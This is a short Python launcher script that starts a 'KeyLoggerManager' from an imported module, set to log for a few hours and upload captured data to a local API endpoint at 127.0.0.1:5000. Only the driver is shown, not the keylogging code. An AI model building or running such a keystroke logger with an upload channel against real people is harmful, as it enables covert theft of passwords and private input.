import manager
hour = 60*60
#amount of hours to log for
log_hours = 3
def main():
    program = manager.KeyLoggerManager(3, "woodrow", "http://127.0.0.1:5000/api/upload", False)
    for i in range(1):
        program.run()
if __name__ == "__main__":
    main()